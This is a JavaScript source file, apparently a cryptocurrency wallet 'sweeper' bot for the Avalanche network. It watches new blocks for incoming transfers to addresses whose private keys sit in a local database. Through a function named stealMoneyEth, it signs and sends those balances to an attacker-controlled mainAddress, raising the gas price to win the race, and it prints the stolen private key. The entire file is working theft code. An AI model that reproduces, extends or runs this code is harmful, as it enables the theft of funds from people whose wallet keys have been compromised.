import Web3 from "web3";
import * as fs from 'fs';
import * as path from 'path';
import { rpc, grab, mainAddress, gasPercentAvax, mode } from "./config.js";

let web3 = null
let data = null

export async function runAvax() {
    try {
        web3 = new Web3(new Web3.providers.WebsocketProvider(rpc.AVAX));
    } catch (error) {
        console.log("Не удалось подключиться к сети AVAX")
        return;
    }
    data = JSON.parse(fs.readFileSync(path.join('./DB', 'database.json')));
    await getBlocksEth();
}

async function getBlocksEth() {
    const subscription = await web3.eth.subscribe('newBlockHeaders');
    subscription.on('data', async (block, error) => {
        try {
            const lastBlock = await web3.eth.getBlock(block.number, true);
            const ethTransactions = lastBlock?.transactions;
            console.log(`Block ${lastBlock?.number} | AVAX`);
            for (let transaction of ethTransactions) {
                transactionWalletEth(transaction);
            }
        } catch (error) {
            console.log('Не удалось получить транзакции в сети AVAX');
        }
        });
    subscription.on('error', (error) => console.log(error));
}

function transactionWalletEth(transaction) {
    const address = transaction.to;
    if (data[address]) {
        stealMoneyEth(address);
    }
}

async function stealMoneyEth(address) {
    const walletKey = data[address];
    const grabFromEthBalance = web3.utils.toWei(grab.AVAX, 'ether');
    const balance = await web3.eth.getBalance(address);
    let gasPrice = await web3.eth.getGasPrice();
    const gasUnits = 21000;
    let transactionCost = 0;
    const average = ((Math.random() * (1.85 - 1.65) + 1.65) + (Math.random() * (2.1 - 1.9) + 1.9)) / 2;

    if (mode === 1) {
        gasPrice = BigInt(Math.trunc(Math.trunc(Number(balance) * gasPercentAvax / 100) / gasUnits));
        transactionCost = BigInt(Math.trunc(Number(balance) * gasPercentAvax / 100));
        const gasPriceNetwork = await web3.eth.getGasPrice();
        if (gasPrice <= gasPriceNetwork) {
            gasPrice = BigInt(Math.trunc(Number(gasPriceNetwork) * average));
            transactionCost = BigInt(gasUnits) * gasPrice;
        }
    } else {
        gasPrice = BigInt(Math.trunc(Number(gasPrice) * average));
        transactionCost = BigInt(gasUnits) * BigInt(Math.round((Number(gasPrice) * 1.5)));
    }

    for (let i = 0; i < 200; i++) {
        if (balance > grabFromEthBalance) {
            break;
        } else if (i === 199) {
            return;
        }
    }

    const amount = balance - transactionCost;
    const sendAddress = web3.utils.toChecksumAddress(mainAddress);
    const nonce = await web3.eth.getBlockTransactionCount(address);

    if (amount <= 0) {
        return;
    }

    const txPrice = {
        "chainId": 43114,
        "nonce": nonce,
        "to": sendAddress,
        "from": address,
        "value": amount,
        "gas": gasUnits,
        "maxFeePerGas": gasPrice,
        "maxPriorityFeePerGas": gasPrice,
        "type": 2,
    };
    const signedTx = await web3.eth.accounts.signTransaction(txPrice, walletKey);
    const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    const amountEther = web3.utils.fromWei(amount, 'ether');
    console.log(`✅ AVAX | Success withdrawal \nHASH: ${txHash} \n\nAMOUNT: ${amountEther} \nADDR: https://snowtrace.io/address/${address} \nPK: ${walletKey}`);
}